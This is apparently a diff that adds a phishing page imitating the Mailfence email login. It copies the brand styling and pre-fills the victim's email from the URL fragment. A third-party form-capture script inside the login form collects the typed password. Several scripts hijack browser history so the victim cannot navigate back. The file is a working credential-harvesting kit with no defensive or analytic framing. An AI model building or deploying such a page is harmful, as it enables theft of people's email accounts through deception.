@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mailfence - Log in</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            /* Exact match of the dark blue vignette radial gradient background */
+            background: radial-gradient(circle, #0c2b5c 0%, #051329 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+        }
+
+        /* Top Brand Identity Header Area */
+        .header-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 28px;
+            text-decoration: none;
+        }
+
+        .logo-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: #2196f3;
+        }
+
+        .logo-text {
+            font-size: 28px;
+            font-weight: 500;
+            color: #ffffff;
+            letter-spacing: -0.5px;
+        }
+
+        /* Centered White Layout Frame Box Card */
+        .login-card {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 480px;
+            padding: 44px;
+            border-radius: 8px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+            position: relative;
+        }
+
+        /* Top row back arrow elements alignment */
+        .card-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 32px;
+            position: relative;
+        }
+
+        .back-arrow {
+            position: absolute;
+            left: 0;
+            font-size: 20px;
+            color: #888888;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .card-title {
+            width: 100%;
+            text-align: center;
+            font-size: 20px;
+            font-weight: 600;
+            color: #222222;
+        }
+
+        form {
+            width: 100%;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #b0c4de;
+            border-radius: 4px;
+            font-size: 15px;
+            color: #333333;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        /* Exact sky blue active focus border feature */
+        .form-control:focus {
+            border-color: #1a73e8;
+        }
+
+        .form-control.pass-field {
+            padding-right: 44px;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 16px;
+            bottom: 14px;
+            color: #888888;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        /* Lost password query link node element placement */
+        .lost-password-link {
+            display: inline-block;
+            color: #1a73e8;
+            font-size: 14px;
+            text-decoration: none;
+            margin-top: 4px;
+            margin-bottom: 28px;
+        }
+
+        .lost-password-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Exact thick rectangular medium-blue solid Enter button block */
+        .submit-btn {
+            width: 100%;
+            background-color: #1a73e8;
+            color: #ffffff;
+            border: none;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 500;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.15s ease;
+            margin-bottom: 24px;
+        }
+
+        .submit-btn:hover {
+            background-color: #155cb4;
+        }
+
+        /* Bottom sign up footnote alignment block */
+        .signup-row {
+            text-align: center;
+        }
+
+        .signup-link {
+            color: #1a73e8;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .signup-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Fixed Background Desktop System Watermark Overlay Component */
+        .system-watermark {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            text-align: left;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.2);
+            line-height: 1.4;
+            user-select: none;
+            pointer-events: none;
+            z-index: 10;
+        }
+    </style>
+</head>
+<body>
+
+    
+    <a href="#" class="header-logo">
+        <div class="logo-icon">
+            <svg width="32" height="32" viewBox="0 0 24 24" fill="currentColor">
+                <path d="M12 2L2 22h20L12 2zm-1 6h2v6h-2V8zm0 8h2v2h-2v-2z"/>
+            </svg>
+        </div>
+        <div class="logo-text">Mailfence</div>
+    </a>
+
+    <!-- Floating Layout Interactive Panel Box Component -->
+    <main class="login-card">
+        <div class="card-header">
+            <a href="#" class="back-arrow">←</a>
+            <h1 class="card-title">Log in</h1>
+        </div>
+    
+        <form action="" method="POST">
+<script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
+            <div class="form-group">
+                <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
+            </div>
+
+            <div class="form-group">
+<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+                <span class="password-toggle">👁</span>
+            </div>
+
+            <a href="#" class="lost-password-link">Lost password ?</a>
+
+            <button type="submit" class="submit-btn">Enter</button>
+        </form>
+
+        <div class="signup-row">
+            <a href="#" class="signup-link">Sign up</a>
+        </div>
+    </main>
+
+   
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+</body>
+</html>
